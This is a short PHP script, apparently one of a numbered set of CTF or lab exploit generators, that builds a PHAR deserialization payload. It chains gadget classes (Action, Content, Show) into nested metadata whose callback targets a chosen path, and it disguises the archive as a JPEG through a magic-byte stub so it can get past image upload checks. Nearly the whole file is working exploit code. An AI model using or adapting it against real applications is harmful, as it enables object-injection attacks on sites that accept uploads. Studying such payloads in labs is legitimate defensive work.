<?php
class Action {
    protected $path;
    protected $id;
    public function __construct($path, $id) {
        $this->path = $path;
        $this->id = $id;
    }
}
class Content {
    public $formatters;
    public function __construct($action) {
        $this->formatters = ['reset' => [$action, 'isPathValid']];
    }
}
class Show {
    public $source;
    public $str;
    public $reader;
}
if ($argc < 3) {
    fwrite(STDERR, "usage: php build_027_phar_nested_generic.php <target_path> <output_file>\n");
    exit(1);
}
$target = $argv[1];
$out = $argv[2];
$tmp = $out . '.phar';
@unlink($tmp);
@unlink($out);
$action = new Action($target, '1');
$content = new Content($action);
$inner = new Show();
$inner->source = 'index.php';
$inner->str = $content;
$inner->reader = null;
$outer = new Show();
$outer->source = $inner;
$outer->str = null;
$outer->reader = null;
$phar = new Phar($tmp);
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub("\xFF\xD8\xFF\n<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($outer);
$phar->stopBuffering();
rename($tmp, $out);
echo $out, PHP_EOL;
